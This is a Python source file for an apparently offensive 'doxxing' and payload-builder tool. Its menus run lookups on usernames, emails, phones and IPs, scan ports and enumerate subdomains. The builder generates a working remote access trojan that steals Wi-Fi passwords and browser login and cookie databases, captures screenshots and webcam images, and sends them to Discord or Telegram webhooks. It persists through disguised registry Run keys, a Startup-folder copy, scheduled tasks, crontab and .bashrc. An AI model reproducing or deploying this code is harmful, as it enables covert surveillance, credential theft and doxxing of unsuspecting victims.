#!/usr/bin/env python3

import os
import sys
import base64
import json
import datetime
import random
import string
import platform
import requests
import socket
import threading
import time
import subprocess
import re
import hashlib
import urllib.parse
import ipaddress
import dns.resolver
import phonenumbers
from phonenumbers import carrier, geocoder, timezone
from bs4 import BeautifulSoup
from colorama import init, Fore, Style

init(autoreset=True)

BLOOD_RED = '\033[38;2;139;0;0m'
DARK_RED = '\033[38;2;139;0;0m'
RESET = '\033[0m'

ASCII_ART = DARK_RED + """
░▒▓██████████████▓▒░ ░▒▓██████▓▒░ ░▒▓███████▓▒░▒▓████████▓▒░▒▓███████▓▒░ ░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓██████▓▒░   
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░        
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░        
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░      ░▒▓████████▓▒░
""" + RESET

CREDIT = DARK_RED + "═══════════════════════════════════════════════════════════════════════\n" + DARK_RED + "                      CREDIT: @shsbaaid on tg\n" + DARK_RED + "═══════════════════════════════════════════════════════════════════════\n" + RESET

class Utils:
    @staticmethod
    def clear():
        os.system('cls' if os.name == 'nt' else 'clear')
    
    @staticmethod
    def random_string(length=8):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

class OSINTModule:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
    
    def username_lookup(self, username):
        sites = [
            ("GitHub", f"https://github.com/{username}"),
            ("Reddit", f"https://www.reddit.com/user/{username}"),
            ("Twitter", f"https://twitter.com/{username}"),
            ("Instagram", f"https://www.instagram.com/{username}/"),
            ("TikTok", f"https://www.tiktok.com/@{username}"),
            ("YouTube", f"https://www.youtube.com/@{username}"),
            ("Steam", f"https://steamcommunity.com/id/{username}"),
            ("Twitch", f"https://www.twitch.tv/{username}"),
            ("Pinterest", f"https://www.pinterest.com/{username}/"),
            ("Telegram", f"https://t.me/{username}"),
            ("Snapchat", f"https://www.snapchat.com/add/{username}"),
            ("Medium", f"https://medium.com/@{username}"),
            ("SoundCloud", f"https://soundcloud.com/{username}"),
            ("Spotify", f"https://open.spotify.com/user/{username}"),
            ("GitLab", f"https://gitlab.com/{username}"),
            ("LinkedIn", f"https://www.linkedin.com/in/{username}"),
            ("CodePen", f"https://codepen.io/{username}"),
            ("Replit", f"https://replit.com/@{username}"),
            ("Mastodon", f"https://mastodon.social/@{username}"),
            ("Tumblr", f"https://{username}.tumblr.com"),
            ("DeviantArt", f"https://www.deviantart.com/{username}"),
            ("VK", f"https://vk.com/{username}"),
            ("Facebook", f"https://www.facebook.com/{username}"),
            ("About.me", f"https://about.me/{username}"),
            ("Flickr", f"https://www.flickr.com/people/{username}/"),
            ("Vimeo", f"https://vimeo.com/{username}"),
            ("Dailymotion", f"https://www.dailymotion.com/{username}"),
            ("Behance", f"https://www.behance.net/{username}"),
            ("Dribbble", f"https://dribbble.com/{username}"),
            ("Keybase", f"https://keybase.io/{username}")
        ]
        
        print(DARK_RED + f"\n[•] Searching for '{username}'...\n" + RESET)
        found = []
        
        for site, url in sites:
            try:
                r = self.session.get(url, timeout=3, allow_redirects=True)
                if r.status_code == 200:
                    print(DARK_RED + f"[+] {site}: {url}" + RESET)
                    found.append({"site": site, "url": url})
                else:
                    print(DARK_RED + f"[-] {site}: Not found" + RESET)
            except:
                print(DARK_RED + f"[-] {site}: Error" + RESET)
        
        return found
    
    def email_lookup(self, email):
        print(DARK_RED + f"\n[•] Looking up email: {email}\n" + RESET)
        results = {}
        
        if not re.match(r"[^@]+@[^@]+\.[^@]+", email):
            print(DARK_RED + "[-] Invalid email format" + RESET)
            return results
        
        domain = email.split('@')[1]
        try:
            answers = dns.resolver.resolve(domain, 'MX')
            print(DARK_RED + f"[+] Domain: {domain} has mail servers" + RESET)
            results['mx'] = [str(r.exchange) for r in answers]
        except:
            print(DARK_RED + f"[-] No MX records for {domain}" + RESET)
        
        hash = hashlib.md5(email.lower().encode()).hexdigest()
        gravatar_url = f"https://www.gravatar.com/avatar/{hash}"
        r = requests.get(gravatar_url)
        if r.status_code == 200:
            print(DARK_RED + f"[+] Gravatar: {gravatar_url}" + RESET)
            results['gravatar'] = gravatar_url
        
        try:
            r = requests.get(f"https://haveibeenpwned.com/unifiedsearch/{email}")
            if r.status_code == 200:
                print(DARK_RED + f"[+] Email found in breaches" + RESET)
                results['breached'] = True
        except:
            pass
        
        return results
    
    def phone_lookup(self, phone):
        print(DARK_RED + f"\n[•] Looking up phone: {phone}\n" + RESET)
        
        try:
            phone_number = phonenumbers.parse(phone, None)
            valid = phonenumbers.is_valid_number(phone_number)
            
            if valid:
                country = geocoder.description_for_number(phone_number, "en")
                carrier_name = carrier.name_for_number(phone_number, "en")
                timezones = timezone.time_zones_for_number(phone_number)
                national = phonenumbers.format_number(phone_number, phonenumbers.PhoneNumberFormat.NATIONAL)
                international = phonenumbers.format_number(phone_number, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
                
                print(DARK_RED + f"[+] Country: {country}" + RESET)
                print(DARK_RED + f"[+] Carrier: {carrier_name}" + RESET)
                print(DARK_RED + f"[+] Timezone: {', '.join(timezones)}" + RESET)
                print(DARK_RED + f"[+] National: {national}" + RESET)
                print(DARK_RED + f"[+] International: {international}" + RESET)
                
                return {
                    "valid": True,
                    "country": country,
                    "carrier": carrier_name,
                    "timezones": list(timezones),
                    "national": national,
                    "international": international
                }
            else:
                print(DARK_RED + "[-] Invalid phone number" + RESET)
                return {"valid": False}
        except Exception as e:
            print(DARK_RED + f"[-] Error: {e}" + RESET)
            return {"valid": False, "error": str(e)}
    
    def ip_lookup(self, ip):
        print(DARK_RED + f"\n[•] Looking up IP: {ip}\n" + RESET)
        
        try:
            r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
            data = r.json()
            
            if data.get('status') == 'success':
                print(DARK_RED + f"[+] IP: {data.get('query')}" + RESET)
                print(DARK_RED + f"[+] Country: {data.get('country')} ({data.get('countryCode')})" + RESET)
                print(DARK_RED + f"[+] Region: {data.get('regionName')}" + RESET)
                print(DARK_RED + f"[+] City: {data.get('city')}" + RESET)
                print(DARK_RED + f"[+] ZIP: {data.get('zip')}" + RESET)
                print(DARK_RED + f"[+] Coordinates: {data.get('lat')}, {data.get('lon')}" + RESET)
                print(DARK_RED + f"[+] Timezone: {data.get('timezone')}" + RESET)
                print(DARK_RED + f"[+] ISP: {data.get('isp')}" + RESET)
                print(DARK_RED + f"[+] Organization: {data.get('org')}" + RESET)
                print(DARK_RED + f"[+] ASN: {data.get('as')}" + RESET)
                return data
            else:
                print(DARK_RED + f"[-] Error: {data.get('message')}" + RESET)
                return None
        except Exception as e:
            print(DARK_RED + f"[-] Error: {e}" + RESET)
            return None
    
    def dns_lookup(self, domain):
        print(DARK_RED + f"\n[•] DNS Lookup for: {domain}\n" + RESET)
        
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME']
        
        for record in record_types:
            try:
                answers = dns.resolver.resolve(domain, record)
                print(DARK_RED + f"[+] {record} Records:" + RESET)
                for r in answers:
                    print(DARK_RED + f"    {r}" + RESET)
            except:
                print(DARK_RED + f"[-] No {record} records" + RESET)
    
    def port_scan(self, target, start=1, end=1024):
        print(DARK_RED + f"\n[•] Scanning {target} from port {start} to {end}\n" + RESET)
        
        open_ports = []
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.3)
                result = sock.connect_ex((target, port))
                if result == 0:
                    try:
                        service = socket.getservbyport(port)
                    except:
                        service = "unknown"
                    open_ports.append({'port': port, 'service': service})
                    print(DARK_RED + f"[+] Port {port} open: {service}" + RESET)
                sock.close()
            except:
                pass
        
        threads = []
        for port in range(start, end + 1):
            t = threading.Thread(target=scan_port, args=(port,))
            t.daemon = True
            threads.append(t)
            t.start()
            if len(threads) >= 100:
                for t in threads:
                    t.join()
                threads = []
        
        for t in threads:
            t.join()
        
        print(DARK_RED + f"\n[+] Found {len(open_ports)} open ports" + RESET)
        return open_ports
    
    def subdomain_enum(self, domain):
        print(DARK_RED + f"\n[•] Enumerating subdomains for: {domain}\n" + RESET)
        
        common = ['www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk', 'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig', 'm', 'imap', 'test', 'ns', 'blog', 'pop3', 'dev', 'www2', 'admin', 'forum', 'news', 'vpn', 'ns3', 'mail2', 'new', 'mysql', 'old', 'lists', 'support', 'mobile', 'mx', 'static', 'docs', 'beta', 'shop', 'sql', 'secure', 'demo', 'cp', 'calendar', 'wiki', 'web', 'media', 'email', 'images', 'img', 'download', 'dns', 'stats']
        
        found = []
        
        for sub in common:
            subdomain = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(subdomain)
                print(DARK_RED + f"[+] {subdomain} -> {ip}" + RESET)
                found.append({'subdomain': subdomain, 'ip': ip})
            except:
                pass
        
        print(DARK_RED + f"\n[+] Found {len(found)} subdomains" + RESET)
        return found

class PayloadGenerator:
    def __init__(self):
        self.webhooks = []
    
    def add_webhook(self, webhook_type, url):
        self.webhooks.append({'type': webhook_type, 'url': url})
    
    def clear_webhooks(self):
        self.webhooks = []
    
    def generate_rat(self):
        webhooks_list = json.dumps(self.webhooks)
        
        return f'''#!/usr/bin/env python3
import os,sys,platform,socket,uuid,json,datetime,subprocess,getpass,requests,threading,time,shutil,sqlite3,cv2,pyautogui,psutil
from pathlib import Path

webhooks = {webhooks_list}
SLEEP=30

def send(data,file=None):
    def send_single(w,d,f):
        try:
            if w['type']=='discord':
                if f and os.path.exists(f):
                    with open(f,'rb') as x:requests.post(w['url'],files={{"file":(os.path.basename(f),x)}},timeout=5)
                else:
                    if len(d)>1900:
                        for i in range(0,len(d),1900):requests.post(w['url'],json={{"content":d[i:i+1900]}},timeout=3)
                    else:requests.post(w['url'],json={{"content":d}},timeout=3)
            elif w['type']=='telegram':
                p=w['url'].split('/');t=p[-2];c=p[-1]
                if f and os.path.exists(f):
                    with open(f,'rb') as x:requests.post(f"https://api.telegram.org/bot{{t}}/sendDocument",data={{"chat_id":c}},files={{"document":x}},timeout=5)
                else:requests.post(f"https://api.telegram.org/bot{{t}}/sendMessage",json={{"chat_id":c,"text":d[:4000]}},timeout=3)
            else:
                if f and os.path.exists(f):
                    with open(f,'rb') as x:requests.post(w['url'],files={{"file":x}},timeout=5)
                else:requests.post(w['url'],json={{"data":d}},timeout=3)
        except:pass
    threads=[]
    for w in webhooks:
        t=threading.Thread(target=send_single,args=(w,data,file))
        t.daemon=True;threads.append(t);t.start()
    for t in threads:t.join(timeout=2)

def get_info():
    i={{"hostname":socket.gethostname(),"os":platform.system(),"osv":platform.version(),"arch":platform.architecture()[0],"cpu":os.cpu_count(),"user":getpass.getuser(),"home":str(Path.home()),"cwd":os.getcwd(),"uuid":str(uuid.uuid4()),"mac":':'.join(['{{:02x}}'.format((uuid.getnode()>>e)&0xff) for e in range(0,2*6,2)][::-1]),"time":datetime.datetime.now().isoformat(),"boot":datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S"),"mem":str(psutil.virtual_memory().percent)+"%","disk":str(psutil.disk_usage('/').percent)+"%","ip_local":"unknown","ip_public":"unknown"}}
    try:s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect(("8.8.8.8",80));i["ip_local"]=s.getsockname()[0];s.close()
    except:pass
    try:i["ip_public"]=requests.get('https://api.ipify.org',timeout=3).text.strip()
    except:pass
    return i

def wifi_steal():
    if platform.system()!="Windows":return""
    r=""
    try:
        p=subprocess.check_output("netsh wlan show profiles",shell=True,text=True)
        for l in p.split('\\n'):
            if "All User Profile" in l:
                prof=l.split(":")[1].strip()
                try:
                    o=subprocess.check_output(f'netsh wlan show profile "{{prof}}" key=clear',shell=True,text=True)
                    r+=f"SSID: {{prof}}\\n"
                    for x in o.split('\\n'):
                        if "Key Content" in x:r+=f"Pass: {{x.split(':')[1].strip()}}\\n\\n"
                except:pass
    except:pass
    return r

def screenshot():
    try:s=pyautogui.screenshot();p=f"ss_{{int(time.time())}}.png";s.save(p);return p
    except:return None

def webcam():
    try:c=cv2.VideoCapture(0);r,f=c.read();c.release()
    if r:p=f"cam_{{int(time.time())}}.jpg";cv2.imwrite(p,f);return p
    except:return None

def browser_steal():
    if platform.system()!="Windows":return[]
    r=[]
    b={{"Chrome":os.path.expandvars(r"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default"),"Edge":os.path.expandvars(r"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default"),"Brave":os.path.expandvars(r"%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Default")}}
    for n,p in b.items():
        if os.path.exists(p):
            ld=os.path.join(p,"Login Data")
            if os.path.exists(ld):
                d=f"{{n}}_login_{{int(time.time())}}.db"
                try:shutil.copy2(ld,d);r.append(d)
                except:pass
            ck=os.path.join(p,"Cookies")
            if os.path.exists(ck):
                d=f"{{n}}_cookies_{{int(time.time())}}.db"
                try:shutil.copy2(ck,d);r.append(d)
                except:pass
    return r

def persist():
    try:
        c=sys.executable if getattr(sys,'frozen',False) else __file__
        if platform.system()=="Windows":
            s=os.path.expandvars(r"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            if os.path.exists(s):
                d=os.path.join(s,"winupdate.py");shutil.copy2(c,d)
                try:
                    import winreg
                    k=winreg.HKEY_CURRENT_USER
                    sk=r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
                    with winreg.OpenKey(k,sk,0,winreg.KEY_SET_VALUE) as reg:winreg.SetValueEx(reg,"WinUpdate",0,winreg.REG_SZ,d)
                except:pass
        else:
            cl=f"@reboot python3 {os.path.abspath(__file__)} >/dev/null 2>&1"
            try:
                cur=subprocess.check_output(["crontab","-l"],stderr=subprocess.DEVNULL).decode()
                with open("/tmp/cron.tmp","w") as f:f.write(cur+cl+"\\n")
                subprocess.run(["crontab","/tmp/cron.tmp"]);os.remove("/tmp/cron.tmp")
            except:pass
            try:
                with open(os.path.expanduser("~/.bashrc"),"a") as f:f.write(f"\\npython3 {os.path.abspath(__file__)} >/dev/null 2>&1 &\\n")
            except:pass
    except:pass

if not os.path.exists(".installed"):persist();open(".installed","w").write("1")

while True:
    try:
        i=get_info();w=wifi_steal();b=browser_steal()
        msg=f"""**MOSERCOPE**\\n```\\nHost: {{i['hostname']}}\\nOS: {{i['os']}} {{i['osv']}}\\nUser: {{i['user']}}\\nIP: {{i['ip_local']}} (local)\\nIP: {{i['ip_public']}} (public)\\nMAC: {{i['mac']}}\\nMem: {{i['mem']}}\\nDisk: {{i['disk']}}\\nBoot: {{i['boot']}}\\nCPU: {{i['cpu']}} cores\\n```"""
        if w:msg+=f"\\n**WiFi**\\n```\\n{{w[:1000]}}```"
        send(msg)
        ss=screenshot()
        if ss:send("",ss);os.remove(ss)
        wc=webcam()
        if wc:send("",wc);os.remove(wc)
        for bf in b:send("",bf);os.remove(bf)
    except:pass
    time.sleep(SLEEP)
'''

    def generate_persistence(self):
        webhooks_list = json.dumps(self.webhooks)
        
        return f'''#!/usr/bin/env python3
import os,sys,platform,shutil,subprocess,getpass,requests,threading,time,socket

webhooks = {webhooks_list}

def send(data):
    def send_single(w,d):
        try:
            if w['type']=='discord':
                if len(d)>1900:
                    for i in range(0,len(d),1900):requests.post(w['url'],json={{"content":d[i:i+1900]}},timeout=3)
                else:requests.post(w['url'],json={{"content":d}},timeout=3)
            elif w['type']=='telegram':
                p=w['url'].split('/');t=p[-2];c=p[-1]
                requests.post(f"https://api.telegram.org/bot{{t}}/sendMessage",json={{"chat_id":c,"text":d[:4000]}},timeout=3)
            else:requests.post(w['url'],json={{"data":d}},timeout=3)
        except:pass
    threads=[]
    for w in webhooks:
        t=threading.Thread(target=send_single,args=(w,data))
        t.daemon=True;threads.append(t);t.start()
    for t in threads:t.join(timeout=2)

def install():
    try:
        c=sys.executable if getattr(sys,'frozen',False) else __file__
        if platform.system()=="Windows":
            s=os.path.expandvars(r"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            if os.path.exists(s):
                d=os.path.join(s,"svchost.py");shutil.copy2(c,d)
                try:
                    import winreg
                    k=winreg.HKEY_CURRENT_USER
                    sk=r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
                    with winreg.OpenKey(k,sk,0,winreg.KEY_SET_VALUE) as reg:winreg.SetValueEx(reg,"WindowsService",0,winreg.REG_SZ,d)
                except:pass
                try:subprocess.run(f'schtasks /create /tn "WindowsService" /tr "python {{d}}" /sc daily /st 09:00 /f',shell=True)
                except:pass
        else:
            cl=f"@reboot python3 {os.path.abspath(__file__)} >/dev/null 2>&1"
            try:
                cur=subprocess.check_output(["crontab","-l"],stderr=subprocess.DEVNULL).decode()
                with open("/tmp/cron.tmp","w") as f:f.write(cur+cl+"\\n")
                subprocess.run(["crontab","/tmp/cron.tmp"]);os.remove("/tmp/cron.tmp")
            except:pass
            try:open(os.path.expanduser("~/.bashrc"),"a").write(f"\\npython3 {os.path.abspath(__file__)} >/dev/null 2>&1 &\\n")
            except:pass
        return True
    except:return False

h=socket.gethostname();u=getpass.getuser()
send(f"**Persistence**\\nHost: {{h}}\\nUser: {{u}}\\nOS: {{platform.system()}}")
r=install()
send(f"**Result**\\nHost: {{h}}\\nSuccess: {{r}}")
while True:time.sleep(3600)
'''

class Tool:
    def __init__(self):
        self.osint = OSINTModule()
        self.payload = PayloadGenerator()
    
    def show_banner(self):
        Utils.clear()
        print(CREDIT)
        print(ASCII_ART)
        print(DARK_RED + "═══════════════════════════════════════════════════════════════════════" + RESET)
        print("")
    
    def run(self):
        while True:
            self.show_banner()
            print(DARK_RED + "[ MAIN MENU ]" + RESET)
            print("1. OSINT / Doxxing Tools")
            print("2. Payload Builder")
            print("3. Webhook Manager")
            print("4. Exit")
            
            choice = input(DARK_RED + "\n[?] Select: " + RESET)
            
            if choice == '1':
                self.osint_menu()
            elif choice == '2':
                self.builder_menu()
            elif choice == '3':
                self.webhook_menu()
            elif choice == '4':
                print(DARK_RED + "\n[-] Exiting" + RESET)
                sys.exit(0)
    
    def osint_menu(self):
        while True:
            self.show_banner()
            print(DARK_RED + "[ OSINT / DOXXING TOOLS ]" + RESET)
            print("1. Username Lookup")
            print("2. Email Lookup")
            print("3. Phone Number Lookup")
            print("4. IP Address Lookup")
            print("5. DNS Lookup")
            print("6. Port Scanner")
            print("7. Subdomain Enumeration")
            print("8. Back")
            
            choice = input(DARK_RED + "\n[?] Select: " + RESET)
            
            if choice == '1':
                u = input(DARK_RED + "[?] Username: " + RESET)
                self.osint.username_lookup(u)
            elif choice == '2':
                e = input(DARK_RED + "[?] Email: " + RESET)
                self.osint.email_lookup(e)
            elif choice == '3':
                p = input(DARK_RED + "[?] Phone (with country code): " + RESET)
                self.osint.phone_lookup(p)
            elif choice == '4':
                i = input(DARK_RED + "[?] IP: " + RESET)
                self.osint.ip_lookup(i)
            elif choice == '5':
                d = input(DARK_RED + "[?] Domain: " + RESET)
                self.osint.dns_lookup(d)
            elif choice == '6':
                t = input(DARK_RED + "[?] Target IP: " + RESET)
                s = input(DARK_RED + "[?] Start port (1): " + RESET) or "1"
                e = input(DARK_RED + "[?] End port (1024): " + RESET) or "1024"
                self.osint.port_scan(t, int(s), int(e))
            elif choice == '7':
                d = input(DARK_RED + "[?] Domain: " + RESET)
                self.osint.subdomain_enum(d)
            elif choice == '8':
                break
            
            input(DARK_RED + "\n[+] Press Enter" + RESET)
    
    def webhook_menu(self):
        while True:
            self.show_banner()
            print(DARK_RED + "[ WEBHOOK MANAGER ]" + RESET)
            print(f"Current Webhooks: {len(self.payload.webhooks)}")
            
            if self.payload.webhooks:
                print(DARK_RED + "\nConfigured:" + RESET)
                for i, w in enumerate(self.payload.webhooks, 1):
                    print(f"  {i}. {w['type']}: {w['url'][:50]}...")
            
            print("\n1. Add Discord Webhook")
            print("2. Add Telegram Webhook")
            print("3. Add Generic Webhook")
            print("4. Clear All")
            print("5. Back")
            
            choice = input(DARK_RED + "\n[?] Select: " + RESET)
            
            if choice == '1':
                url = input(DARK_RED + "[?] Discord URL: " + RESET)
                self.payload.add_webhook('discord', url)
                print(DARK_RED + "[+] Added" + RESET)
            elif choice == '2':
                token = input(DARK_RED + "[?] Bot Token: " + RESET)
                chat = input(DARK_RED + "[?] Chat ID: " + RESET)
                self.payload.add_webhook('telegram', f"{token}/{chat}")
                print(DARK_RED + "[+] Added" + RESET)
            elif choice == '3':
                url = input(DARK_RED + "[?] URL: " + RESET)
                t = input(DARK_RED + "[?] Type (discord/telegram/web): " + RESET) or "web"
                self.payload.add_webhook(t, url)
                print(DARK_RED + "[+] Added" + RESET)
            elif choice == '4':
                self.payload.clear_webhooks()
                print(DARK_RED + "[+] Cleared" + RESET)
            elif choice == '5':
                break
            
            input(DARK_RED + "\n[+] Press Enter" + RESET)
    
    def builder_menu(self):
        while True:
            self.show_banner()
            print(DARK_RED + "[ PAYLOAD BUILDER ]" + RESET)
            print(f"Webhooks: {len(self.payload.webhooks)}")
            print("\n1. Generate Full RAT (All Features)")
            print("2. Generate Persistence Only")
            print("3. Back")
            
            choice = input(DARK_RED + "\n[?] Select: " + RESET)
            
            if choice == '1':
                if not self.payload.webhooks:
                    print(DARK_RED + "[-] Add webhooks first" + RESET)
                else:
                    name = input(DARK_RED + "[?] Output name (rat.py): " + RESET) or "rat.py"
                    code = self.payload.generate_rat()
                    with open(name, 'w') as f:
                        f.write(code)
                    print(DARK_RED + f"[+] Saved to {name}" + RESET)
            elif choice == '2':
                if not self.payload.webhooks:
                    print(DARK_RED + "[-] Add webhooks first" + RESET)
                else:
                    name = input(DARK_RED + "[?] Output name (persist.py): " + RESET) or "persist.py"
                    code = self.payload.generate_persistence()
                    with open(name, 'w') as f:
                        f.write(code)
                    print(DARK_RED + f"[+] Saved to {name}" + RESET)
            elif choice == '3':
                break
            
            input(DARK_RED + "\n[+] Press Enter" + RESET)

if __name__ == "__main__":
    tool = Tool()
    tool.run()
